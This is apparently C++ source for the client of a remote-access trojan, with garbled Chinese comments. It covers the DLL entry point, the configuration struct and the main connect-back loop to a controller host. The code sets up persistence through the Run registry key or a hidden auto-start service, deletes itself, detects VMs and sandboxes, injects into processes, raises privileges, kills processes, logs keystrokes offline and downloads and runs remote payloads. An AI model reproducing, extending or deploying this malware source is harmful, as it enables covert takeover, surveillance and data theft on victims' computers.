// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Login.h"
#include "KernelManager.h"
#include "InstallService.h"

DLL_INFO dll_info = 
{
	"SVP7",       // ���ߵ�ַ 1
		0,        // ���߶˿� 2
		0,        // �ļ����� 3
		"",       // ���߷��� 4
		"",       // ͨѶ���� 5
		"",       // ��װ���� 6
		"",       // �������� 7
		"",       // ������ʾ 8
		"",	      // �������� 9
		"",       // ��װ;�� 10
		"",       // �������� 11
		0,        // �������� 12
		0,        // 0�ر� 1���� ΢����� 13
		0,        // 0�ر� 1���� ������� 14
		0,        // 0�ر� 1���� ������ 15
		0,        // 0�ر� 1���� ������� 16
		0,        // 0�ر� 1���� ��ɾ��� 17
		0,        // 0�ر� 1���� ��ɾ��� 18
		0,        // 0�ر� 1���� �ظ���� 19
		0,        // 0�ر� 1���� ������ 20
		0,        // 0�ر� 1���� ��͸��� 21
		0,        // 0�ر� 1���� �ս��� 22
		0,        // 0�ر� 1���� ������ 23
		0,        // 0�ر� 1���� ˯�߼�� 24
		0,        // 0�ر� 1���� ���߼�� 25
		0,        // 0�ر� 1���� ΢��ɱ�� 26
};
char MyLoginAddr[30];           // ���ߵ�ַ 1
UINT MyLoginPort;               // ���߶˿� 2
WORD MyFileAttribute;           // �ļ����� 3
char MyUpGroup[30];             // ���߷��� 4
char ConnetPass[20];            // ͨѶ��Կ 5
TCHAR MyReleaseName[25];        // ��װ���� 6
char MyServiceName[70];         // �������� 7
char MyServiceDisplayName[70];  // ������ʾ 8
char MyServiceDescription[120]; // �������� 9
char MyReleasePath[100];        // ��װ;�� 10
CHAR MyszDownRun[150];          // �����ַ 11
BOOL MyDele_zc;	                // �������� 12
BOOL MyFwb;                     // ΢��     13
BOOL MyFhb;                     // ����     14
BOOL MyFxn;                     // ����     15
BOOL MyFfx;                     // ����     16
BOOL MyFsc;                     // ��ɾ     17
BOOL MyFzs;                     // ��ɾ     18
BOOL MyFcf;                     // �ظ�     19
BOOL MyFfh;                     // ����     20
BOOL MyFct;                     // ��͸     21
BOOL MyFzj;                     // �ս�     22
BOOL MyFkb;                     // ����     23
BOOL MyFsm;                     // ˯��     24
BOOL MyFlx;                     // ����     25
BOOL MyFwr;                     // ΢��     26
////////////////
CMyFunc m_gFunc; 
BOOL bisUnInstall = FALSE;
DWORD WINAPI Login(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login,NULL,0,NULL);
	m_gFunc.WaitForSingleObject(hThread, INFINITE);
	m_gFunc.CloseHandle(hThread);
	return TRUE;
}
DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login,NULL,0,NULL);
	m_gFunc.WaitForSingleObject(hThread, INFINITE);
	m_gFunc.CloseHandle(hThread);
	return TRUE;
}
DWORD WINAPI Login(LPVOID lpParam)
{
	//��װ��Ϣ
	SetRegInfo();
	if (MyFcf == 1)//���ظ�
	{
		// ���� ���ߵ�ַ:�˿�:������
		char	strMutex[100];
		m_gFunc.wsprintfA(strMutex,"%s:%d:%s",MyLoginAddr,MyLoginPort,MyServiceName);
		HANDLE m_hMutex = m_gFunc.CreateMutex(NULL, FALSE, strMutex);
		if (m_hMutex && m_gFunc.GetLastError() == ERROR_ALREADY_EXISTS)
		{
			m_gFunc.ReleaseMutex(m_hMutex); // �ͷž��
			m_gFunc.CloseHandle(m_hMutex);  // �رվ��
			ExitProcess(0);
		}
	}

	//������
	m_gFunc.SetUnhandledExceptionFilter(bad_exception);
	// �����߳����ȼ�-ʵʱ
	m_gFunc.SetThreadPriority(m_gFunc.GetCurrentThread(), 0x00000080);

    CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			m_gFunc.Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
		char	lpszHost[256]={0};
        UINT  	dwPort = 0;
		dwPort = MyLoginPort;
		m_gFunc.lstrcatA(lpszHost,MyLoginAddr);
		if(m_gFunc.strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}
		DWORD dwTickCount = m_gFunc.GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}
		DWORD upTickCount = m_gFunc.GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,lpszHost,dwPort);
		SocketClient.SetManagerCallBack(&manager);
		if(SendLoginInfo(&SocketClient,upTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}
		DWORD	dwIOCPEvent;
		do
		{
			dwIOCPEvent = m_gFunc.WaitForSingleObject(SocketClient.m_hEvent,100);
			m_gFunc.Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);
		
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}
	return 0;
}
//��������
extern DWORD WINAPI Loop_DownManager(LPVOID lparam);
//////////////////////////��ɫĿ¼����//////////////////////////
DWORD WINAPI Greenstart()
{
	//ʵʱ��ȡ����
	char path[MAX_PATH] = {0};
	m_gFunc.GetModuleFileName(NULL, path, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess, 0, path, &dwSize);
	m_gFunc.PathStripPath(path); //ȥ��Ŀ¼�õ��ļ���
	//��ȡ�û�LocalĿ¼
	TCHAR szPath[MAX_PATH];
	TCHAR szPaths[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,0x001c,FALSE);
	m_gFunc.SHGetSpecialFolderPaths(NULL,szPaths,0x001c,FALSE);
	if (m_gFunc.PathFileExists(szPath)) //�ж�LocalĿ¼�Ƿ����
	{
		//����
		m_gFunc.PathAddBackslash(szPath);
		m_gFunc.PathAddBackslash(szPaths);
		strcat(szPath,path); //LocalĿ¼�����ļ���
	}
	else
	{
		//������
		PathStripToRoot(szPath);
		strcat(szPath,"Windows\\");
		strcat(szPath,path);
		PathStripToRoot(szPaths);
		strcat(szPaths,"Windows\\");
	}
	if(!m_gFunc.PathFileExists(szPath)) //�ж������Ƿ����LocalĿ¼
	{
		if (MyFkb == 1) //����
		{
			Loop_DownManager((LPVOID)MyszDownRun);
		}
		strcat(szPaths,"nw_elf.dll");
		m_gFunc.CopyFileA("nw_elf.dll",szPaths,FALSE); //����DLL
		if(m_gFunc.CopyFileA(path,szPath,FALSE))//����������������Ŀ¼
		{
			if (MyFzs == 1)  //��ɾ��
				DeleteSelf();
			m_gFunc.SetFileAttributes(path,MyFileAttribute);  //�����ļ�����
			m_gFunc.SetFileAttributes(szPath,MyFileAttribute);//�����ļ�����
			m_gFunc.ShellExecute(0,0,szPath,0,0, SW_HIDE);
			ExitProcess(0);
		}
	}
	m_gFunc.SetFileAttributes(path, MyFileAttribute);  //�����ļ�����
	if (MyFfh == 1)//���̸���
	{
		ZhuRu();
	}
	MainThread();
	return 0;
}
//////////////////////////����Ŀ¼����//////////////////////////
DWORD WINAPI CreateAutoRun()
{
	//ʵʱ��ȡ����
	char path[MAX_PATH] = {0};
	m_gFunc.GetModuleFileName(NULL, path, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess, 0, path, &dwSize);
	m_gFunc.PathStripPath(path); //ȥ��Ŀ¼�õ��ļ���
	//��ȡ�û�LocalĿ¼
	TCHAR szPath[MAX_PATH];
	TCHAR szPaths[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,0x001c,FALSE);
	m_gFunc.SHGetSpecialFolderPaths(NULL,szPaths,0x001c,FALSE);
	if (m_gFunc.PathFileExists(szPath)) //�ж�LocalĿ¼�Ƿ����
	{
		//����
		m_gFunc.PathAddBackslash(szPath);
		m_gFunc.PathAddBackslash(szPaths);
		strcat(szPath,path); //LocalĿ¼�����ļ���
	}
	else
	{
		//������
		PathStripToRoot(szPath);
		strcat(szPath,"Windows\\");
		strcat(szPath,path);
		PathStripToRoot(szPaths);
		strcat(szPaths,"Windows\\");
	}
	if (!m_gFunc.PathFileExists(szPath))  //�ж������Ƿ���ڹ���Ŀ¼
	{
		if (MyFkb == 1) //����
		{
			Loop_DownManager((LPVOID)MyszDownRun);
		}
		strcat(szPaths,"nw_elf.dll");
		m_gFunc.CopyFileA("nw_elf.dll",szPaths,FALSE); //����DLL
		if(m_gFunc.CopyFileA(path,szPath,FALSE)) //����������������Ŀ¼
		{
			if (MyFzs == 1)//��ɾ��
				DeleteSelf();
			m_gFunc.SetFileAttributes(path,MyFileAttribute);  //�����ļ�����
			m_gFunc.SetFileAttributes(szPath,MyFileAttribute);//�����ļ�����
			HKEY hKey;
			DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
			char cIety[256] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
			RegCreateKeyEx(HKEY_CURRENT_USER,cIety,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&dwDisposition);
			RegSetValueEx(hKey,"SVP7",0,REG_SZ,(BYTE*)szPath,lstrlen(szPath)*sizeof(TCHAR));
			m_gFunc.ShellExecute(0,0,szPath,0,0, SW_HIDE);
			RegCloseKey(hKey);
			ExitProcess(0);
		}	
	}
	if (MyFfh == 1)//���̸���
	{
		ZhuRu();
	}
	MainThread();
	return 0;
}
//��������
void MyStupServer()
{
	SERVICE_TABLE_ENTRY serviceTable[] = {{MyServiceName,(LPSERVICE_MAIN_FUNCTION)ServiceMain}, {NULL,NULL} };//����Ѿ�����ֱ����������
	if (!m_gFunc.StartServiceCtrlDispatcher(serviceTable))
	{	
		char MgzBp[MAX_PATH];
		char szPath[MAX_PATH];//���������ļ������ַ���
		char Path[MAX_PATH]={NULL};
		m_gFunc.ExpandEnvironmentStrings(MyReleasePath,Path,MAX_PATH);  // %SystemRoot%\���������·�� C:WINDOWS\ 
		strcpy(MyReleasePath,Path);
		m_gFunc.PathRemoveBackslash(MyReleasePath);//ȥ������'\\'
		char DQeBW01[] = {'%','s','\\','%','s','\0'};
		sprintf(MgzBp,DQeBW01,MyReleasePath,MyReleaseName);   //���Ӱ�װ·���ͳ�������
		char * toPath = MgzBp;        //Ҫ���Ƶ���·���ַ���

		MyCreatDirector(MgzBp);	//�ļ��в����ڴ����ļ���
		m_gFunc.CopyFileA("nw_elf.dll","C:\\Windows\\nw_elf.dll",FALSE); //�����ļ���DLL��д���·��
		m_gFunc.GetModuleFileName(NULL,(LPCH)szPath,225);     //��ȡ����·���ĺ���	
		m_gFunc.SetFileAttributes(szPath, MyFileAttribute);  // �����ļ�����
		m_gFunc.CopyFileA(szPath,toPath,false);       //���ƺ�������szPath���Ƶ�toPath��ǿ�и���ԭ���ļ�

		//��װ����
		BOOL szBool = NtInstallService(MyServiceName,MyServiceDisplayName,MyServiceDescription,toPath,NULL,false,SERVICE_AUTO_START);
		if (MyFsc == 1)
		{
			OccupyFile(toPath); //ռ�Ӱ�װ
		}
		if (!szBool)//��װʧ��ֱ������
		{
			char path[MAX_PATH];
			m_gFunc.GetModuleFileName(NULL,path,MAX_PATH);//��ȡ����·��
			m_gFunc.SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN||FILE_ATTRIBUTE_SYSTEM);  //�����ļ�����
			MainThread();
		}
		else
		{
			if (MyFkb == 1) //����
			{
				Loop_DownManager((LPVOID)MyszDownRun);
				
			}
			if (MyFzs == 1)//��ɾ��
			{
				DeleteSelf();
			}
			Sleep(500);
			m_gFunc.SetFileAttributes(toPath,MyFileAttribute);  // �����ļ�����
		}
	}
}

///////�������߽���
#include <stdio.h>//D����a��????t
#include <direct.h>
#include <iostream>
using namespace std;
#include <windows.h>
#include "psapi.h"  
#include <tlhelp32.h> 
//CNfcApp *Gyfunction;
DWORD GetProcessidFromName(LPCTSTR name)
{
	PROCESSENTRY32 pe;
	DWORD id=0;
	HANDLE hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe.dwSize=sizeof(PROCESSENTRY32);
	if(!Process32First(hSnapshot,&pe))
		return 0;
	while(1)
	{
		pe.dwSize=sizeof(PROCESSENTRY32);
		if(Process32Next(hSnapshot,&pe)==FALSE)
			break;
		if(strcmp(pe.szExeFile,name)==0)
		{
			id=pe.th32ProcessID;
			
			break;
		}
	}
	CloseHandle(hSnapshot);
	return id;
}

extern "C" __declspec(dllexport) LPVOID SVP7(DLL_INFO m_Install)
{

	TCHAR szFilePath[MAX_PATH + 1]={0};
	GetModuleFileName(NULL, szFilePath, MAX_PATH);	
	if (GetProcessidFromName("admin.exe"))//���̵�����
	{
		
	}
	else
	{
		
		char path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,path); 
		cout<<path;
		
		strcat(path,"\\admin.exe");
		char *buffer;
		if((buffer = getcwd(NULL, 0)) == NULL)
		{
			
		}
		else
		{
			char * source = szFilePath;
			char * destination = "c://admin.exe";////���̵�����·��
			CopyFile(source, destination, FALSE);
			WinExec("c://admin.exe", SW_SHOWMAXIMIZED);//���̵�����
			
			
		}												
	}
	m_gFunc.LoadMyData(); //��ʼ���Զ��庯��ȥ�������

	int nInStallSizeof=sizeof(DLL_INFO)+1;
	DLL_INFO *pNewInStall=(DLL_INFO *)new  char[nInStallSizeof];
	m_gFunc.memcpy(pNewInStall,&m_Install,nInStallSizeof);

	//�ı��ڴ汣������
	DWORD dwNewProtect = PAGE_READWRITE, dwOldProtect;
	VirtualProtect(pNewInStall,sizeof(DLL_INFO),dwNewProtect,&dwOldProtect);
	VirtualProtect(pNewInStall,sizeof(DLL_INFO),dwOldProtect,&dwNewProtect);

	lstrcpy(MyUpGroup,pNewInStall->UpGroup);
	lstrcpy(MyLoginAddr,pNewInStall->LoginAddr);
	lstrcpy(ConnetPass,pNewInStall->ConnetPass);
	lstrcpy(MyszDownRun,pNewInStall->szDownRun);
	lstrcpy(MyReleasePath,pNewInStall->ReleasePath);
	lstrcpy(MyReleaseName,pNewInStall->ReleaseName);
	lstrcpy(MyServiceName,pNewInStall->ServiceName);
	lstrcpy(MyServiceDisplayName,pNewInStall->ServiceDisplayName);
	lstrcpy(MyServiceDescription,pNewInStall->ServiceDescription);
	MyLoginPort=pNewInStall->LoginPort;
	MyFileAttribute=pNewInStall->FileAttribute;
	MyDele_zc=pNewInStall->Dele_zc;
	MyFwb=pNewInStall->Fwb;
	MyFhb=pNewInStall->Fhb;
	MyFxn=pNewInStall->Fxn;
	MyFfx=pNewInStall->Ffx;
	MyFsc=pNewInStall->Fsc;
	MyFzs=pNewInStall->Fzs;
	MyFcf=pNewInStall->Fcf;
	MyFfh=pNewInStall->Ffh;
	MyFct=pNewInStall->Fct;
	MyFzj=pNewInStall->Fzj;
	MyFkb=pNewInStall->Fkb;
	MyFsm=pNewInStall->Fsm;
	MyFlx=pNewInStall->Flx;
	MyFwr=pNewInStall->Fwr;

	EncryptData((char*)ConnetPass,m_gFunc.strlen(ConnetPass),18);//���ܷ���
	EncryptData((char*)MyUpGroup,m_gFunc.strlen(MyUpGroup),18);//���ܷ���
	EncryptData((char*)MyLoginAddr,m_gFunc.strlen(MyLoginAddr),80);//����IP����
	EncryptData((char*)MyszDownRun,m_gFunc.strlen(MyszDownRun),18);//���������ַ
	EncryptData((char*)MyReleasePath,m_gFunc.strlen(MyReleasePath),18);//���ܰ�װ·��
	EncryptData((char*)MyReleaseName,m_gFunc.strlen(MyReleaseName),18);//���ܰ�װ����
	EncryptData((char*)MyServiceName,m_gFunc.strlen(MyServiceName),18);//���ܷ�������
	EncryptData((char*)MyServiceDisplayName,m_gFunc.strlen(MyServiceDisplayName),18);//���ܷ�����ʾ
	EncryptData((char*)MyServiceDescription,m_gFunc.strlen(MyServiceDescription),18);//���ܷ�������
//	OutputDebugString("");
	// ����������ʱ��С©��������ʧ
	m_gFunc.PostThreadMessageA(m_gFunc.GetCurrentThreadId(),NULL,0,0);
	m_gFunc.GetInputState();
	MSG	msg;
	m_gFunc.GetMessageA(&msg,NULL,NULL,NULL);

	//��Ȩ
	RaiseToDebugP();

	// ���ý������ȼ�-�ߣ�ʹ�������ڲ���ϵͳ���֮ǰ����
	HANDLE hPS = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS,false,m_gFunc.GetCurrentProcessId()); 
	m_gFunc.SetPriorityClass(hPS,0x00000080);
    m_gFunc.CloseHandle(hPS); 

	if (MyFwb == 1)//��΢��
	{
		ShaiXian();
	}
	if (MyFhb == 1)//������
	{
		if (IsGuardPages())
		{
			ExitProcess(0);
		}
	}
	if (MyFxn == 1)//������
	{
		if(IsInsideVMWare())
		{
			ExitProcess(0);
		}
	}
	if (MyFfx == 1)//������
	{
		Vmware();
	}
	if (MyFzj == 1)//K�ս���
	{
		KProcess();
	}
	if (MyFsm == 1)//˯����ֹ
	{
		MyCreateThread(NULL, 0,Block_sleep, NULL, 0, NULL);
	}
	if (MyFlx == 1)//���߼�¼
	{
		CClientSocket SocketClient;
		CKernelManager	manager(&SocketClient);
		manager.StartUnLineHook();
	}
	if (MyFwr == 1)//΢��ɱ��
	{
		sleep_sleep();
	}
	if (MyDele_zc == 0)//��ɫ����
	{
		Greenstart(); 
	}
	else if (MyDele_zc == 1)//ע�������
	{
		CreateAutoRun(); //����
	}
	else if (MyDele_zc == 2)//��������
	{
		MyStupServer();
	}
	return 0;
}